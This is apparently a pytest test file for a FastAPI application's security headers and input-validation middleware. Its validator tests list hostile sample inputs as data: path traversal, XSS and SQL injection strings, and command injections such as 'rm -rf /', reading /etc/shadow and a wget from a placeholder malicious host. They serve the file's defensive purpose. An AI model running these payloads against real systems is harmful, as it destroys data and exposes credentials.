"""
Unit tests for security middleware components.
"""
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi import Request, Response
from fastapi.testclient import TestClient
import secrets
import os

from app.utils.security_middleware import SecurityHeadersMiddleware
from app.utils.exceptions import SecurityViolationException
from app.utils.validation_middleware import InputValidator, validation_middleware


class TestSecurityHeadersMiddleware:
    """Test security headers middleware"""
    
    @pytest.fixture
    def middleware(self):
        """Create middleware instance"""
        app = MagicMock()
        return SecurityHeadersMiddleware(app)
    
    @pytest.fixture
    def mock_request(self):
        """Create mock request"""
        request = MagicMock(spec=Request)
        request.url.path = "/api/v1/test"
        request.state = MagicMock()
        return request
    
    @pytest.fixture
    def mock_response(self):
        """Create mock response"""
        response = MagicMock(spec=Response)
        response.headers = {}
        return response
    
    @pytest.mark.asyncio
    async def test_security_headers_added(self, middleware, mock_request, mock_response):
        """Test that security headers are added to response"""
        async def mock_call_next(request):
            return mock_response
        
        result = await middleware.dispatch(mock_request, mock_call_next)
        
        # Check that security headers were added
        assert "X-Frame-Options" in result.headers
        assert "X-Content-Type-Options" in result.headers
        assert "X-XSS-Protection" in result.headers
        assert "Content-Security-Policy" in result.headers
        assert "Referrer-Policy" in result.headers
        
        # Check header values
        assert result.headers["X-Frame-Options"] == "DENY"
        assert result.headers["X-Content-Type-Options"] == "nosniff"
        assert result.headers["X-XSS-Protection"] == "1; mode=block"
    
    @pytest.mark.asyncio
    async def test_csp_nonce_generated(self, middleware, mock_request, mock_response):
        """Test that CSP nonce is generated and added"""
        async def mock_call_next(request):
            return mock_response
        
        result = await middleware.dispatch(mock_request, mock_call_next)
        
        # Check that nonce is in CSP header
        csp_header = result.headers.get("Content-Security-Policy", "")
        assert "nonce-" in csp_header
        
        # Check that nonce header is added
        assert middleware.csp_nonce_header in result.headers
    
    @pytest.mark.asyncio
    @patch.dict(os.environ, {"ENV": "production"})
    async def test_hsts_header_in_production(self, middleware, mock_request, mock_response):
        """Test that HSTS header is added in production"""
        async def mock_call_next(request):
            return mock_response
        
        result = await middleware.dispatch(mock_request, mock_call_next)
        
        assert "Strict-Transport-Security" in result.headers
        assert "max-age=31536000" in result.headers["Strict-Transport-Security"]
    
    @pytest.mark.asyncio
    @patch.dict(os.environ, {"ENV": "development"})
    async def test_no_hsts_in_development(self, middleware, mock_request, mock_response):
        """Test that HSTS header is not added in development"""
        async def mock_call_next(request):
            return mock_response
        
        result = await middleware.dispatch(mock_request, mock_call_next)
        
        # HSTS header should be empty in development
        hsts_header = result.headers.get("Strict-Transport-Security", "")
        assert hsts_header == ""
    
    def test_is_sensitive_endpoint(self, middleware):
        """Test sensitive endpoint detection"""
        mock_request = MagicMock()
        
        # Test sensitive endpoints
        mock_request.url.path = "/api/v1/auth/login"
        assert middleware._is_sensitive_endpoint(mock_request) == True
        
        mock_request.url.path = "/api/v1/security/stats"
        assert middleware._is_sensitive_endpoint(mock_request) == True
        
        # Test non-sensitive endpoints
        mock_request.url.path = "/api/v1/health"
        assert middleware._is_sensitive_endpoint(mock_request) == False


class TestInputValidator:
    """Test input validation middleware"""
    
    @pytest.fixture
    def validator(self):
        """Create validator instance"""
        return InputValidator()
    
    @pytest.fixture
    def mock_request(self):
        """Create mock request"""
        request = MagicMock(spec=Request)
        request.url.path = "/api/v1/test"
        request.query_params = {}
        request.headers = {"Content-Type": "application/json"}
        request.client.host = "127.0.0.1"
        return request
    
    @pytest.mark.asyncio
    async def test_validate_normal_request(self, validator, mock_request):
        """Test validation of normal request"""
        result = await validator.validate_request(mock_request)
        assert result == True
    
    @pytest.mark.asyncio
    async def test_path_traversal_detection(self, validator, mock_request):
        """Test path traversal attack detection"""
        mock_request.url.path = "/api/v1/../../../etc/passwd"
        
        result = await validator.validate_request(mock_request)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_null_byte_detection(self, validator, mock_request):
        """Test null byte injection detection"""
        mock_request.url.path = "/api/v1/test\x00"
        
        result = await validator.validate_request(mock_request)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_long_path_rejection(self, validator, mock_request):
        """Test rejection of overly long paths"""
        mock_request.url.path = "/api/v1/" + "a" * 3000
        
        result = await validator.validate_request(mock_request)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_malicious_query_params(self, validator, mock_request):
        """Test malicious query parameter detection"""
        mock_request.query_params = {"param": "<script>alert('xss')</script>"}
        
        result = await validator.validate_request(mock_request)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_sql_injection_detection(self, validator):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "'; INSERT INTO users VALUES ('hack'); --"
        ]
        
        for malicious_input in malicious_inputs:
            result = await validator._validate_string_input(malicious_input)
            assert result == False, f"Failed to detect SQL injection: {malicious_input}"
    
    @pytest.mark.asyncio
    async def test_xss_detection(self, validator):
        """Test XSS pattern detection"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for malicious_input in malicious_inputs:
            result = await validator._validate_string_input(malicious_input)
            assert result == False, f"Failed to detect XSS: {malicious_input}"
    
    @pytest.mark.asyncio
    async def test_command_injection_detection(self, validator):
        """Test command injection pattern detection"""
        malicious_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/evil.sh",
            "; cat /etc/shadow"
        ]
        
        for malicious_input in malicious_inputs:
            result = await validator._validate_string_input(malicious_input)
            assert result == False, f"Failed to detect command injection: {malicious_input}"
    
    @pytest.mark.asyncio
    async def test_json_depth_limit(self, validator):
        """Test JSON depth limitation"""
        # Create deeply nested JSON
        deep_json = {}
        current = deep_json
        for i in range(15):  # More than MAX_OBJECT_DEPTH (10)
            current["nested"] = {}
            current = current["nested"]
        
        result = await validator._validate_json_data(deep_json, depth=0)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_json_array_size_limit(self, validator):
        """Test JSON array size limitation"""
        large_array = ["item"] * 2000  # More than MAX_ARRAY_LENGTH (1000)
        
        result = await validator._validate_json_data(large_array, depth=0)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_control_character_detection(self, validator):
        """Test control character detection"""
        malicious_input = "normal text\x01\x02\x03"
        
        result = await validator._validate_string_input(malicious_input)
        assert result == False
    
    @pytest.mark.asyncio
    async def test_valid_input_passes(self, validator):
        """Test that valid input passes validation"""
        valid_inputs = [
            "Normal text input",
            "user@example.com",
            "Valid JSON string",
            "Numbers: 12345",
            "Special chars: !@#$%^&*()"
        ]
        
        for valid_input in valid_inputs:
            result = await validator._validate_string_input(valid_input)
            assert result == True, f"Valid input rejected: {valid_input}"


class TestValidationMiddleware:
    """Test validation middleware integration"""
    
    @pytest.mark.asyncio
    async def test_validation_middleware_allows_valid_request(self):
        """Test that middleware allows valid requests"""
        mock_request = MagicMock(spec=Request)
        mock_request.url.path = "/api/v1/test"
        mock_request.query_params = {}
        mock_request.headers = {"Content-Type": "application/json"}
        mock_request.client.host = "127.0.0.1"
        
        async def mock_call_next(request):
            return MagicMock()
        
        # Should not raise exception
        result = await validation_middleware(mock_request, mock_call_next)
        assert result is not None
    
    @pytest.mark.asyncio
    async def test_validation_middleware_blocks_malicious_request(self):
        """Test that middleware blocks malicious requests"""
        mock_request = MagicMock(spec=Request)
        mock_request.url.path = "/api/v1/../../../etc/passwd"
        mock_request.query_params = {}
        mock_request.headers = {"Content-Type": "application/json"}
        mock_request.client.host = "127.0.0.1"
        
        async def mock_call_next(request):
            return MagicMock()
        
        # Should raise HTTPException
        with pytest.raises(Exception):  # HTTPException will be raised
            await validation_middleware(mock_request, mock_call_next)
    
    @pytest.mark.asyncio
    async def test_validation_middleware_skips_health_endpoints(self):
        """Test that middleware skips validation for health endpoints"""
        mock_request = MagicMock(spec=Request)
        mock_request.url.path = "/health"
        
        async def mock_call_next(request):
            return MagicMock()
        
        # Should not validate health endpoints
        result = await validation_middleware(mock_request, mock_call_next)
        assert result is not None
